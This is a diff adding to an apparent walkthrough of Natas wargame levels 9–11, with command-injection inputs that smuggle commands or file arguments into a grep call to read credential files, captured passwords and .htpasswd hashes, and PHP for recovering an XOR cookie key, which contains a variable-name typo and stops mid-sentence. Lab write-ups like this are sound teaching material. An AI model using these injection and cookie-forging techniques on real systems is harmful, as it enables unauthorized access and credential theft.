@@ -387,4 +387,234 @@ The usage of `!` is just so we don't get any matches from either `grep`'s and th
 The `;` allows us to write another command to execute after the first one finished, 
 providing the ability to add the `cat /etc/natas_webpass/natas10` which will print the file.
 
+```html
+<div id="content">
+<form>
+Find words containing: <input name="needle"><input type="submit" name="submit" value="Search"><br><br>
+</form>
+
+
+Output:
+<pre>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
 Could this be done in a shorter way? Yes, however we will need it further down the road.
+
+# Level 10
+
+Level 10 is the same gist, however, there is some user input "sanitization".
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+
+The characters `;`, `|` and `&` are now disabled, but that won't stop us.
+Remember how I said that Level 9 could be done in a shorter way?
+
+Well, it turns out that `grep` can apply one regex to more than one file and that is what we are going to do.
+Right now we still have this:
+
+```bash
+grep -i $key dictionary.txt
+```
+
+And the input is filtered for some characters, however they didn't block `"`, `*` or `.`,
+this way we can define `$key` as being a the regex and another file!
+
+Since now we want to match anything in order for the password to show up we will use `.*` and as a file,
+our dear and beloved `/etc/natas_webpass/natas11` and our input will look like
+
+```bash
+.* /etc/natas_webpass/natas11
+```
+
+If for some reason your output is not sorted by file and the one of the first files isn't the password, use `Ctrl + F`.
+Otherwise you probably got this:
+
+```html
+<div id="content">
+
+For security reasons, we now filter on certain characters<br><br>
+<form _lpchecked="1">
+Find words containing: <input name="needle"><input type="submit" name="submit" value="Search"><br><br>
+</form>
+
+
+Output:
+<pre>.htaccess:AuthType Basic
+.htaccess: AuthName "Authentication required"
+.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+.htaccess: require valid-user
+.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
+.htpasswd:natas10:$1$mRklUuvs$D4FovAtQ6y2mb5vXLAy.P/
+.htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+dictionary.txt:African
+dictionary.txt:Africans
+dictionary.txt:Allah
+...
+```
+
+And there you have it!
+
+# Level 11
+
+This one is a little harder. It's okay to ask for help!
+Especially with the nightmare that is PHP...
+
+For this one I recommend using either the PHP interpreter on your shell or just a online REPL. 
+I used [this](http://phpepl.herokuapp.com/).
+
+The page greets you with a background color "setter". It works, but for our purposes it's useless.
+As usual we will go through the source code and try to pretend we know how PHP works!
+
+This time the code is a little longer:
+
+```php
+<?
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+        if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+                $mydata['showpassword'] = $tempdata['showpassword'];
+                $mydata['bgcolor'] = $tempdata['bgcolor'];
+            }
+        }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+?>
+```
+
+Well, before we begin the page already told us that the cookies are XOR encrypted so we might as well read up on [that](https://en.wikipedia.org/wiki/XOR_cipher).
+
+The TL:DR is, if you want to encrypt `data` with a certain `key`, you XOR all their bits, if the key is too short, cycle it!
+Afterwards you get `encrypted_data` and to decrypt it you need to XOR it with `key`.
+
+Using our logical skills we can deduct that:
+
+```
+data XOR key = encrypted_data
+encrypted_data XOR key = data
+
+data XOR encrypted_data = key
+```
+
+And it is in fact true. 
+This means that even before analysing our code we can already construct a plan.
+
+  - Get the original data
+  - Get the encrypted data from the cookie
+  - XOR them to get the key
+  - ???
+  - We got the password
+
+So first things first, lets take a look at the source, we already know what `xor_encrypt` does, so lets skip it.
+Before looking at the functions, we should see what the script will actually run!
+This starts with `$data = loadData($defaultdata);`, then if the `bgcolor` value exists, change the background to it and finally a call to `saveData($data);`.
+
+We are now ready to dive into it. Starting with `loadData($defaultdata)` and 
+looking at `$defaultdata` for now it's just this weird array that is also a dictionary or whatever you kids call it these days.
+
+Entering the function we can see it defines two variables, a global one `$COOKIE`, which will be the cookie being used, 
+and a local one `$mydata`, nothing more than a copy of `$def` (which is our `$defaultdata`).
+
+As we are able to see in `if(array_key_exists("data", $_COOKIE))`, it checks if the cookie exists before actually doing something, 
+no big deal, however it is useful to identify what our cookie will look like!
+
+Afterwards, it defines a new variable:
+
+```php
+$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+```
+
+This is more interesting, we can see they are trying to hide it from plainsight! Or in this case, trying to decode it.
+It first uses `base64_decode` to decode the `Base64` string, then the `xor_encrypt` to decrypt the content and finally a `json_decode` and all this on the cookie!
+
+The code afterwards is just input validation and some logic for the color picker so we won't look at it (it's PHP anyway, don't feel bad).
+
+Before going back to the code, we need to see the cookie!
+Just like in the previous levels you should go to the Storage, etc, etc.
+
+When in there you'll see the cookie `data`, containing the value `ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D` (the `%3D` can be removed).
+
+Now that we have our cookie, back to our code, we need to reverse the process, time to take matters into our hands!
+
+We know that the cookie we have is the result of all that processing applied to the `$defaultdata`.
+This way, we can XOR the original with the encrypted data to get the key!
+
+We'll do it like this:
+
+```php
+<?php
+function xor_encrypt($in) {
+    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+    $text = $in;
+    $outText = '';
+
+    for($i=0;$i<strlen($text);$i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$decoded_b64 = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw");
+$decrypted_key = xor_encrypt($decoded_b64);
+echo $decripted_key;
+?>
+```
+
+Note that we modified the key to be the JSON encoded value array!
+Running this will print `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`, notice the pattern? 
+`qw8J` is the key! And now we can use it to encrypt the 
